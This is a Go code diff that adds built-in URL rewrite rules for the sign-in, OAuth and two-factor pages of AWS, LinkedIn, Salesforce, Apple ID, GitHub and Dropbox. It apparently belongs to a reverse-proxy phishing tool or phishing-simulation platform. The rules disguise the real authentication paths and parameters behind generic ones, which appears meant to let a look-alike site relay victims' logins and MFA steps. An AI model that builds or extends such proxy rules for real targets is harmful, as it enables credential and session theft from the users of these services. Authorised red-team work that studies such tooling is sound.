@@ -2799,6 +2799,26 @@ func GetBuiltinRewriteRulesForDomain(targetDomain string) []ProxyServiceURLRewri
 	case strings.Contains(domain, "okta.com"):
 		return getOktaRewriteRules()
 
+	case strings.Contains(domain, "signin.aws.amazon.com") ||
+		strings.Contains(domain, "console.aws.amazon.com"):
+		return getAWSRewriteRules()
+
+	case strings.Contains(domain, "linkedin.com"):
+		return getLinkedInRewriteRules()
+
+	case strings.Contains(domain, "login.salesforce.com"):
+		return getSalesforceRewriteRules()
+
+	case strings.Contains(domain, "appleid.apple.com") ||
+		strings.Contains(domain, "idmsa.apple.com"):
+		return getAppleRewriteRules()
+
+	case strings.Contains(domain, "github.com"):
+		return getGitHubRewriteRules()
+
+	case strings.Contains(domain, "dropbox.com"):
+		return getDropboxRewriteRules()
+
 	default:
 		return nil
 	}
@@ -2908,6 +2928,135 @@ func getOktaRewriteRules() []ProxyServiceURLRewriteRule {
 		{
 			Find:    "/login/login.htm",
 			Replace: "/signin",
+		},
+	}
+}
+
+// getAWSRewriteRules returns rewrite rules for AWS login paths
+func getAWSRewriteRules() []ProxyServiceURLRewriteRule {
+	return []ProxyServiceURLRewriteRule{
+		{
+			Find:    "/signin",
+			Replace: "/login",
+		},
+		{
+			Find:    "/oauth",
+			Replace: "/connect",
+			Query: []ProxyServiceURLRewriteQueryParam{
+				{Find: "client_id", Replace: "cid"},
+				{Find: "redirect_uri", Replace: "ruri"},
+			},
+		},
+		{
+			Find:    "/mfa",
+			Replace: "/verify",
+		},
+	}
+}
+
+// getLinkedInRewriteRules returns rewrite rules for LinkedIn login paths
+func getLinkedInRewriteRules() []ProxyServiceURLRewriteRule {
+	return []ProxyServiceURLRewriteRule{
+		{
+			Find:    "/login",
+			Replace: "/signin",
+		},
+		{
+			Find:    "/uas/authenticate",
+			Replace: "/auth",
+		},
+		{
+			Find:    "/checkpoint/challenge",
+			Replace: "/step",
+		},
+	}
+}
+
+// getSalesforceRewriteRules returns rewrite rules for Salesforce login paths
+func getSalesforceRewriteRules() []ProxyServiceURLRewriteRule {
+	return []ProxyServiceURLRewriteRule{
+		{
+			Find:    "/services/oauth2/authorize",
+			Replace: "/connect",
+			Query: []ProxyServiceURLRewriteQueryParam{
+				{Find: "client_id", Replace: "cid"},
+				{Find: "redirect_uri", Replace: "ruri"},
+				{Find: "response_type", Replace: "rt"},
+			},
+		},
+		{
+			Find:    "/services/oauth2/token",
+			Replace: "/verify",
+		},
+	}
+}
+
+// getAppleRewriteRules returns rewrite rules for Apple ID login paths
+func getAppleRewriteRules() []ProxyServiceURLRewriteRule {
+	return []ProxyServiceURLRewriteRule{
+		{
+			Find:    "/auth/authorize",
+			Replace: "/connect",
+			Query: []ProxyServiceURLRewriteQueryParam{
+				{Find: "client_id", Replace: "cid"},
+				{Find: "redirect_uri", Replace: "ruri"},
+				{Find: "response_type", Replace: "rt"},
+				{Find: "scope", Replace: "s"},
+			},
+		},
+		{
+			Find:    "/appleauth/auth/signin",
+			Replace: "/login",
+		},
+		{
+			Find:    "/appleauth/auth/verify/trusteddevice",
+			Replace: "/trust",
+		},
+	}
+}
+
+// getGitHubRewriteRules returns rewrite rules for GitHub login paths
+func getGitHubRewriteRules() []ProxyServiceURLRewriteRule {
+	return []ProxyServiceURLRewriteRule{
+		{
+			Find:    "/login",
+			Replace: "/signin",
+		},
+		{
+			Find:    "/login/oauth/authorize",
+			Replace: "/connect",
+			Query: []ProxyServiceURLRewriteQueryParam{
+				{Find: "client_id", Replace: "cid"},
+				{Find: "redirect_uri", Replace: "ruri"},
+				{Find: "scope", Replace: "s"},
+			},
+		},
+		{
+			Find:    "/sessions/two-factor",
+			Replace: "/verify",
+		},
+	}
+}
+
+// getDropboxRewriteRules returns rewrite rules for Dropbox login paths
+func getDropboxRewriteRules() []ProxyServiceURLRewriteRule {
+	return []ProxyServiceURLRewriteRule{
+		{
+			Find:    "/login",
+			Replace: "/signin",
+		},
+		{
+			Find:    "/oauth2/authorize",
+			Replace: "/connect",
+			Query: []ProxyServiceURLRewriteQueryParam{
+				{Find: "client_id", Replace: "cid"},
+				{Find: "redirect_uri", Replace: "ruri"},
+				{Find: "response_type", Replace: "rt"},
+			},
+		},
+		{
+			Find:    "/two_factor_auth",
+			Replace: "/verify",
 		},
 	}
 }
